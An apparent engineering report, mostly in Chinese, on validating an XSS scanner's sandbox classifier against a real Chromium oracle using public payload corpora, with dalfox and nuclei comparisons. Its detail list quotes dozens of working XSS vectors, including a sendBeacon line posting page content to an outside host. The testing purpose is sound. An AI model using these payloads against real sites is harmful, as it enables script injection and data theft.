# Phase 392:外部开源 XSS 语料 -> 分类器保真度 vs Chromium oracle

向量全部来自第三方开源项目(PortSwigger 2026 cheat sheet / SecLists / PayloadsAllTheThings / OWASP XSS Filter Evasion Cheat Sheet / html5sc),原样使用、不清洗不改写;oracle 是本机真实 Chromium 的 load 态对话框事件;被测对象是引擎 verify gate 用的同一个 sandbox 分类器(见下)。这不是 XSSMaze 那样的 F1 跑分,也不与 194 矩阵、bWAPP、Juice Shop 任何数字并列。

## 语料来源(全部第三方撰写,原样使用)

| corpus | file | sha256_12 | kind | candidates | selected (cap) |
|---|---|---|---|---|---|
| ps-sheet-2026 | pw_cheatsheet_20261114.html | 43af801a07f1 | portsweigger_html | 587 | 65 (65) |
| seclists-jhaddix | seclists_jhaddix.txt | 11d5df9fdea3 | flat | 108 | 20 (20) |
| seclists-brutelogic | seclists_brutelogic.txt | 9faf159b2952 | flat | 114 | 15 (15) |
| seclists-brutelogic-bypass | seclists_brutelogic_bypass.txt | aee4b0513aed | flat | 3 | 3 (5) |
| seclists-rsnake | seclists_rsnake.txt | d6b20fe69e0c | flat | 72 | 15 (15) |
| seclists-somdev | seclists_somdev.txt | 006a620d48d5 | flat | 22 | 5 (5) |
| seclists-mario | seclists_mario.txt | ba3c2dac66a3 | mario_bundle | 139 | 20 (20) |
| pat-filter-bypass | pat_filter_bypass.md | f8e40d7dbdff | md_fences | 5 | 5 (15) |
| pat-polyglot | pat_polyglot.md | e41979c882cc | md_fences | 7 | 7 (8) |
| pat-waf-bypass | pat_waf_bypass.md | 3ae9c2aed72e | md_fences | 15 | 8 (8) |
| pat-readme | pat_readme.md | c91931c0c751 | md_fences | 20 | 14 (14) |
| owasp-evasion | owasp_evasion.md | 7e298e2905c7 | md_fences | 103 | 25 (25) |

去重后唯一向量:**202**;h5sc/vectors.txt 与 SecLists XSS-Vectors-Mario.txt 是同一捆绑(只采一份,不重复计数)。

## M1:sandbox 分类器保真度(引擎真实调用 `judge(page, token="", sink="parser")`)

| 组 | population | oracle EXEC | oracle inert | agree_live | missed | overstated | agree_inert | unknown(exec/inert) | understatement_rate | overstatement_rate |
|---|---|---|---|---|---|---|---|---|---|---|
| **overall** | 2424 | 123 | 2067 | 104 | 16 | 134 | 1917 | 3/16 | 0.1301 | 0.0648 |
| escaped=False | 1616 | 123 | 1262 | 104 | 16 | 134 | 1112 | 3/16 | 0.1301 | 0.1062 |
| escaped=True | 808 | 0 | 805 | 0 | 0 | 0 | 805 | 0/0 | None | 0.0 |
| corpus=owasp-evasion | 300 | 11 | 262 | 10 | 1 | 11 | 251 | 0/0 | 0.0909 | 0.042 |
| corpus=pat-filter-bypass | 60 | 5 | 53 | 5 | 0 | 2 | 51 | 0/0 | 0.0 | 0.0377 |
| corpus=pat-polyglot | 84 | 31 | 45 | 25 | 6 | 4 | 41 | 0/0 | 0.1935 | 0.0889 |
| corpus=pat-readme | 168 | 14 | 146 | 14 | 0 | 21 | 125 | 0/0 | 0.0 | 0.1438 |
| corpus=pat-waf-bypass | 96 | 6 | 88 | 3 | 3 | 6 | 82 | 0/0 | 0.5 | 0.0682 |
| corpus=ps-sheet-2026 | 780 | 23 | 612 | 15 | 5 | 39 | 557 | 3/16 | 0.2174 | 0.0637 |
| corpus=seclists-brutelogic | 180 | 9 | 146 | 8 | 1 | 15 | 131 | 0/0 | 0.1111 | 0.1027 |
| corpus=seclists-brutelogic-bypass | 36 | 3 | 33 | 3 | 0 | 2 | 31 | 0/0 | 0.0 | 0.0606 |
| corpus=seclists-jhaddix | 240 | 12 | 228 | 12 | 0 | 12 | 216 | 0/0 | 0.0 | 0.0526 |
| corpus=seclists-mario | 240 | 3 | 224 | 3 | 0 | 10 | 214 | 0/0 | 0.0 | 0.0446 |
| corpus=seclists-rsnake | 180 | 2 | 178 | 2 | 0 | 9 | 169 | 0/0 | 0.0 | 0.0506 |
| corpus=seclists-somdev | 60 | 4 | 52 | 4 | 0 | 3 | 49 | 0/0 | 0.0 | 0.0577 |

## M1 控制页(oracle/分类器健全性断言)

| control | oracle | sandbox |
|---|---|---|
| ctl-svg-onload | exec | live |
| ctl-img-onerror | exec | live |
| ctl-script-plain | exec | live |
| ctl-autofocus | exec | live |
| ctl-srcdoc | exec | live |
| ctl-attr-breakout | exec | live |
| ctl-benign-text | inert | inert |
| ctl-benign-attr | inert | inert |
| ctl-benign-script | inert | live |

## M1 方向明细(每组前若干条)

- **overstated** `ps-sheet-2026-005__script_dq` ctx=script_dq escaped=False vector=`<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-006__script_dq` ctx=script_dq escaped=False vector=`<body onbeforeprint=console.log(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-007__script_dq` ctx=script_dq escaped=False vector=`<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.inne` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-008__script_dq` ctx=script_dq escaped=False vector=`<svg><animate onbegin=alert(1) attributeName=x dur=1s>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-011__script_dq` ctx=script_dq escaped=False vector=`<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:au` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-012__script_dq` ctx=script_dq escaped=False vector=`<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:au` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-014__script_dq` ctx=script_dq escaped=False vector=`<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></aud` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-015__text` ctx=text escaped=False vector=`<svg><animate onend=alert(1) attributeName=x dur=1s>` oracle=inert sandbox=live why=animate.onend starts on its own (begin=default, measured)
- **overstated** `ps-sheet-2026-015__script_dq` ctx=script_dq escaped=False vector=`<svg><animate onend=alert(1) attributeName=x dur=1s>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **missed** `ps-sheet-2026-017__text` ctx=text escaped=False vector=`<audio src/onerror=alert(1)>` oracle=exec sandbox=inert why=every token-bearing sink is inert: audio[onerror] audio.onerror has an empty src: no load is attempted, so no error fire
- **overstated** `ps-sheet-2026-017__script_dq` ctx=script_dq escaped=False vector=`<audio src/onerror=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **missed** `ps-sheet-2026-017__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`<audio src/onerror=alert(1)>` oracle=exec sandbox=inert why=every token-bearing sink is inert: iframe[srcdoc] srcdoc value carries no live node
- **overstated** `ps-sheet-2026-018__script_dq` ctx=script_dq escaped=False vector=`<a id=x tabindex=1 onfocus=alert(1)></a>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-019__script_dq` ctx=script_dq escaped=False vector=`<xss onfocus=alert(1) autofocus tabindex=1>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-020__script_dq` ctx=script_dq escaped=False vector=`<a id=x tabindex=1 onfocusin=alert(1)></a>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-022__script_dq` ctx=script_dq escaped=False vector=`<body onload=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **missed** `ps-sheet-2026-025__text` ctx=text escaped=False vector=`<audio onloadstart="alert(1)"><source>` oracle=exec sandbox=inert why=every token-bearing sink is inert: audio[onloadstart] audio.onloadstart has no src: nothing loads, so no load event fire
- **overstated** `ps-sheet-2026-026__script_dq` ctx=script_dq escaped=False vector=`<body onmessage=print()>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-027__script_dq` ctx=script_dq escaped=False vector=`<body onpagereveal=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-028__script_dq` ctx=script_dq escaped=False vector=`<body onpageshow=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-031__script_dq` ctx=script_dq escaped=False vector=`<body onpopstate=print()>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-032__script_dq` ctx=script_dq escaped=False vector=`<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-033__text` ctx=text escaped=False vector=`<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />` oracle=inert sandbox=live why=animate.onrepeat starts on its own (begin=default, measured)
- **overstated** `ps-sheet-2026-033__script_dq` ctx=script_dq escaped=False vector=`<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-035__script_dq` ctx=script_dq escaped=False vector=`<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-037__script_dq` ctx=script_dq escaped=False vector=`<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-038__script_dq` ctx=script_dq escaped=False vector=`<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: fle` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-039__script_dq` ctx=script_dq escaped=False vector=`<xss onsecuritypolicyviolation=alert(1)>XSS</xss>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **missed** `ps-sheet-2026-040__text` ctx=text escaped=False vector=`x<template shadowrootmode=open><slot onslotchange=alert(1)>` oracle=exec sandbox=inert why=every token-bearing sink is inert: slot[onslotchange] handler inside <template> content is never rendered or run
- **overstated** `ps-sheet-2026-040__script_dq` ctx=script_dq escaped=False vector=`x<template shadowrootmode=open><slot onslotchange=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **missed** `ps-sheet-2026-040__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`x<template shadowrootmode=open><slot onslotchange=alert(1)>` oracle=exec sandbox=inert why=every token-bearing sink is inert: iframe[srcdoc] srcdoc value carries no live node
- **overstated** `ps-sheet-2026-041__script_dq` ctx=script_dq escaped=False vector=`<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-043__script_dq` ctx=script_dq escaped=False vector=`<details ontoggle=alert(1) open>test</details>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-045__script_dq` ctx=script_dq escaped=False vector=`<xss autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-046__script_dq` ctx=script_dq escaped=False vector=`<body onafterprint=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-047__script_dq` ctx=script_dq escaped=False vector=`<input onauxclick=alert(1)>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-050__script_dq` ctx=script_dq escaped=False vector=`<xss contenteditable onbeforeinput=alert(1)>test` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-051__script_dq` ctx=script_dq escaped=False vector=`<xss onbeforepaste=alert(1)>XSS</xss>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-052__script_dq` ctx=script_dq escaped=False vector=`<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xs` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position
- **overstated** `ps-sheet-2026-053__script_dq` ctx=script_dq escaped=False vector=`<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>` oracle=inert sandbox=live why=<script> body reached by the parser, token at code position

## M2:反射孪生页端到端(上下文分类来自外部语料)

引擎批量扫描 rc=0,4.7s;vuln 孪生 8/8 有 findings,safe 孪生 0/4 有 findings。

| url | findings(layers/severity) |
|---|---|
| /t/vuln/text?q=marker | reflected/high |
| /t/vuln/attr_dq?q=marker | reflected/high |
| /t/vuln/attr_unq?q=marker | reflected/high |
| /t/vuln/script_dq?q=marker | reflected/high |
| /t/vuln/script_block?q=marker | reflected/high |
| /t/vuln/comment?q=marker | reflected/high |
| /t/vuln/href_dq?q=marker | reflected/high |
| /t/vuln/iframe_srcdoc?q=marker | reflected/high |
| /t/safe/text?q=marker | - |
| /t/safe/attr_dq?q=marker | - |
| /t/safe/comment?q=marker | - |
| /t/safe/href_dq?q=marker | - |

### 第三方工具事实表:dalfox(只记事实,不算分)

| kind | context | detected | hits | seconds | error |
|---|---|---|---|---|---|
| vuln | text | False | 0 | 1.3 |  |
| vuln | attr_dq | False | 0 | 1.3 |  |
| vuln | attr_unq | False | 0 | 1.3 |  |
| vuln | script_dq | False | 0 | 45 | timeout |
| vuln | script_block | False | 0 | 1.1 |  |
| vuln | comment | False | 0 | 45 | timeout |
| vuln | href_dq | False | 0 | 5.0 |  |
| vuln | iframe_srcdoc | False | 0 | 1.3 |  |
| safe | text | False | 0 | 1.3 |  |
| safe | attr_dq | False | 0 | 1.3 |  |
| safe | comment | False | 0 | 45 | timeout |
| safe | href_dq | False | 0 | 45 | timeout |

边界:FACT TABLE ONLY. No TP/FP/TN/FN or rates (Phase 380 rule): neither tool was given an execution-level oracle and budgets differ.

### 第三方工具事实表:nuclei(只记事实,不算分)

| kind | context | detected | hits | seconds | error |
|---|---|---|---|---|---|
| vuln | text | True | 1 | 2.4 |  |
| vuln | attr_dq | True | 1 | 0.4 |  |
| vuln | attr_unq | True | 1 | 0.4 |  |
| vuln | script_dq | True | 1 | 0.4 |  |
| vuln | script_block | True | 1 | 0.4 |  |
| vuln | comment | True | 1 | 0.4 |  |
| vuln | href_dq | True | 1 | 0.4 |  |
| vuln | iframe_srcdoc | True | 1 | 0.4 |  |
| safe | text | False | 0 | 0.4 |  |
| safe | attr_dq | False | 0 | 0.4 |  |
| safe | comment | False | 0 | 0.4 |  |
| safe | href_dq | False | 0 | 0.4 |  |

边界:FACT TABLE ONLY. No TP/FP/TN/FN or rates (Phase 380 rule): neither tool was given an execution-level oracle and budgets differ.

## 不可比项

- 本表是『外部向量上 sandbox 分类器与真浏览器的一致性』,不是检测器 F1;XSSMaze(官方靶+官方 scorer)仍是唯一 F1 来源
- oracle 只看 load 态对话框:需要交互的向量与无对话框执行(print()/静默外带)会被记 inert——是 ground truth 的已知局限,不是工具判定
- 烤页(把向量直接写进页面)不在 CLI 扫描器的检出面上:检出是反射驱动的,Phase 392 pilot 实测 8 个 oracle-EXEC 烤页 plain 与 --headless 均 0 findings——这是引擎设计边界,如实记录
- M2 第三方工具行是事实表:dalfox/nuclei 没拿到执行级 oracle,预算也不同,按 Phase 380 规则不出 TP/FP/率

